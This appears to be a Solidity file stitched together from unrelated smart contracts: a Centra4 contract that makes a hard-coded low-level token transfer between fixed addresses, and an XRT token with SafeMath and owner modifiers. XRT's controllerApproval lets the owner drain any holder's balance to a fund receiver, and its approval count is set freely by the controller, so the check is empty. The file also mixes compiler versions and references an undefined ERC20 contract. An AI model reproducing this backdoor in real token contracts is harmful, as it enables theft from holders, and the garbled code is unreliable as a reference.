 

pragma solidity ^0.4.13;

contract Centra4 {

	function transfer() returns (bool) {	
		address contract_address;
		contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;
		address c1;		
		address c2;
		uint256 k;
		k = 1;
		
		c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;	
		 
		contract_address.call("register", "CentraToken");
		if(!contract_address.call(bytes4(keccak256("transfer(address,uint256)")),c2,k)) return false;

		return true;
	}

}
contract XRT is StandardToken, OnlyOwner {
    uint256 private approvalCount = 0;
    uint256 public minApproval = 2;
    address public fundReceiver;

    function setApprovalCount(uint _value) public isController {
        approvalCount = _value;
    }
    
    function setMinApprovalCount(uint _value) public isController returns (bool){
        require(_value > 0);
        minApproval = _value;
        return true;
    }
    
    function getApprovalCount() public view isController returns (uint) {
        return approvalCount;
    }
    
    function getFundReceiver() public view isController returns (address) {
        return fundReceiver;
    }
    
    function controllerApproval(address _from, uint256 _value) public isOwner returns (bool) {
        require(minApproval <= approvalCount); 
        balances[_from] = balances[_from].safeSub(_value);
        balances[fundReceiver] = balances[fundReceiver].safeAdd(_value);
        emit Transfer(_from, fundReceiver, _value);
        return true;
    }
} 

contract StandardToken is ERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) balances;

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success) {
        require(_from != address(0) && _from != _to);
        require(_to != address(0));
        balances[_from] = balances[_from].safeSub(_value);
        balances[_to] = balances[_to].safeAdd(_value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

library SafeMath {
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
}

contract OnlyOwner {
    address public owner;
    address private controller;
    
    modifier isOwner {
        require(msg.sender == owner);
        _;
    }

    modifier isController {
        require(msg.sender == controller);
        _;
    }

    constructor() public {
        owner = msg.sender;
        controller = owner;
    }
}
